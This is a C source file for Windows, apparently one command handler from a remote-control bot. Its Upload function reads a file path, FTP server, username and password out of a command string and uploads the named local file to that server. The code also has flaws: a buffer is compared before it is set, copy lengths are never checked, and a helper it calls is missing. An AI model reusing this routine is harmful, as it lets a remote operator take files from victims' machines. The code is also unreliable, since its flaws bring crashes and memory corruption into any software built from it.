#include <windows.h>
#include <wininet.h>

bool Upload(char Command[200]);

bool Upload(char Command[200])
{
	unsigned short	FileToUploadStart = 8;
	unsigned short	FileToUploadEnd;
	char			FileToUpload[80];

	unsigned short	FtpServerStart;
	unsigned short	FtpServerEnd;
	char			FtpServer[80];

	unsigned short	UserStart;
	unsigned short	UserEnd;
	char			User[20];

	unsigned short	PassStart;
	unsigned short	PassEnd;
	char			Pass[20];

	char			FileRemote[80];
	unsigned short	Position;
	char			TempChar[2];

	HINTERNET		InetConnection;
	char			Agent[] = "Mostrix FTP Upload";
	HINTERNET		FtpConnection;

	FileToUploadEnd = GetParameter(Command, FileToUploadStart);
	lstrcpyn(FileToUpload, Command + FileToUploadStart, FileToUploadEnd - FileToUploadStart);

	FtpServerStart = FileToUploadEnd + 2;
	FtpServerEnd = GetParameter(Command, FtpServerStart);
	lstrcpyn(FtpServer, Command + FtpServerStart, FtpServerEnd - FtpServerStart);

	UserStart = FtpServerEnd + 2;
	UserEnd = GetParameter(Command, UserStart);
	lstrcpyn(User, Command + UserStart, UserEnd - UserStart);

	PassStart = UserEnd + 2;
	PassEnd = GetParameter(Command, PassStart);
	lstrcpyn(Pass, Command + PassStart, PassEnd - PassStart);

	Position = lstrlen(FileToUpload);

	while(lstrcmp(TempChar, "\\") != 0)
	{
		lstrcpyn(TempChar, FileToUpload + Position, 2);
		Position--;
	}

	lstrcpy(FileRemote, FileToUpload + Position + 2);

	InetConnection = InternetOpen(Agent, 0, 0, 0, 0);

	if(InetConnection != 0)
	{
		FtpConnection = InternetConnect(InetConnection, FtpServer, INTERNET_DEFAULT_FTP_PORT, User, Pass, INTERNET_SERVICE_FTP, 0, 0);

		if(FtpConnection != 0)
		{
			if(FtpPutFile(FtpConnection, FileToUpload, FileRemote, FTP_TRANSFER_TYPE_BINARY, 0) == 1)
			{
				InternetCloseHandle(FtpConnection);
				InternetCloseHandle(InetConnection);
				
				return true;
			}

			InternetCloseHandle(FtpConnection);
		}

		InternetCloseHandle(InetConnection);
	}

	return false;
}